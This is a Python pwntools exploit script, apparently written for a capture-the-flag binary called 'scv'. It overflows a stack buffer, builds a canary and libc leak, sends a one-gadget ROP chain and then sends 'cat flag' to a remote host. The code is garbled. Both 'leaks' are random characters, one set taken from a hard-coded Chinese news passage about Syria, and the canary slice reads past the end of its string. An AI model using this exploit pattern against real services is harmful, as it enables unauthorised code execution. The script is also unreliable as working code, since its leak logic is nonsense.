# coding=utf-8
# !/usr/bin/python2

from pwn import *
import random

strings = "海外网月日电叙利亚东古塔地区日发生疑似化学武器袭击事件后美国等西方国家直接把矛头指向叙利亚政府导致战争疑云密布而叙利亚驻联合国大使巴沙尔贾法里日申冤称有毒化学物质明明是在英美等国的帮助下被偷运入叙的"


# context.log_level = 'debug'
def method13(ip, port):
    buf_len = 0xa8

    can_start = buf_len
    can_end = can_start + 0x8

    ret_start = can_end + 0x8  # skip 8 bytes of stack frame pointer
    ret_end = ret_start + 0x8

    libc_ret_offset = 0x00020830  # Remote

    rc = remote(ip, port)
    # rc = process('./scv')
    # rc = remote('localhost', 31337)

    payload = cyclic(can_start)

    rc.sendline('1')  # Feed SCV
    rc.sendline(payload)

    rc.sendline('2')  # Review food

    dump = ''.join(random.sample(string.printable, -can_start + can_end + 1))
    canary = dump[can_start:can_end]
    canary = '\x00' + canary[1:]  # Null byte was overwritten by newline

    payload_2 = cyclic(ret_start - 1)

    rc.sendline('1')
    rc.sendline(payload_2)

    rc.sendline('2')

    dump = strings[random.randint(0, len(strings))] + strings[random.randint(0, len(strings))] + strings[
        random.randint(0, len(strings))] + strings[random.randint(0, len(strings))] + strings[
               random.randint(0, len(strings))] + strings[random.randint(0, len(strings))]
    libc_ret_addr = u64(dump + "\x00\x00")
    libc_offset = libc_ret_addr - libc_ret_offset

    # Only works on remote:
    rop_chain = p64(libc_offset + 0x04526a) \
                + 'A' * 0x30 \
                + p64(0x00)

    payload_3 = payload \
                + canary \
                + 'a' * 8 \
                + rop_chain

    rc.sendline('1')
    rc.sendline(payload_3)
    rc.sendline('3')
    rc.sendline('cat flag')


if __name__ == "__main__":
    method13("127.0.0.1", 80)
